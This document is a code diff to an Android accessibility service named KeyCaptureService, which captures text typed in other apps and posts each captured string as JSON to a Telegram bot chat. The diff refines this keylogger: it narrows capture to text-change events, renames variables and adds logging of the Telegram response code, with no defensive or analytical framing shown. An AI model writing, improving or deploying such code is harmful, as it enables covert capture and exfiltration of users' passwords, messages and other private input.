@@ -16,21 +16,22 @@ public class KeyCaptureService extends AccessibilityService {
 
     @Override
     public void onAccessibilityEvent(AccessibilityEvent event) {
-        if (event.getEventType() == AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED ||
-            event.getEventType() == AccessibilityEvent.TYPE_VIEW_FOCUSED) {
+        int eventType = event.getEventType();
+        if (eventType == AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED) {
             CharSequence text = event.getText();
-            if (text != null && text.length() > 0) {
-                sendToTelegram(text.toString());
+            if (text != null && !text.toString().isEmpty()) {
+                String capturedText = text.toString();
+                sendToTelegram(capturedText);
             }
         }
     }
 
     @Override
     public void onInterrupt() {
-        Log.d(TAG, "Accessibility Service Interrupted");
+        Log.d(TAG, "Service interrupted");
     }
 
-    private void sendToTelegram(final String messageText) {
+    private void sendToTelegram(final String message) {
         new Thread(new Runnable() {
             @Override
             public void run() {
@@ -40,19 +41,22 @@ public class KeyCaptureService extends AccessibilityService {
                     HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                     conn.setRequestMethod("POST");
                     conn.setRequestProperty("Content-Type", "application/json; utf-8");
+                    conn.setRequestProperty("Accept", "application/json");
                     conn.setDoOutput(true);
 
-                    String escapedText = messageText.replace("\"", "\\\"");
-                    String jsonInputString = "{\"chat_id\": \"" + CHAT_ID + "\", \"text\": \"" + escapedText + "\"}";
+                    // Escape quotes to prevent malformed JSON payload
+                    String sanitizedMessage = message.replace("\"", "\\\"");
+                    String jsonInputString = "{\"chat_id\":\"" + CHAT_ID + "\", \"text\":\"" + sanitizedMessage + "\"}";
 
                     try (OutputStream os = conn.getOutputStream()) {
                         byte[] input = jsonInputString.getBytes(StandardCharsets.UTF_8);
                         os.write(input, 0, input.length);
                     }
 
-                    conn.getResponseCode();
+                    int responseCode = conn.getResponseCode();
+                    Log.d(TAG, "Telegram response code: " + responseCode);
                 } catch (Exception e) {
-                    Log.e(TAG, "Error transmitting payload to Telegram", e);
+                    Log.e(TAG, "Failed to send to Telegram", e);
                 }
             }
         }).start();
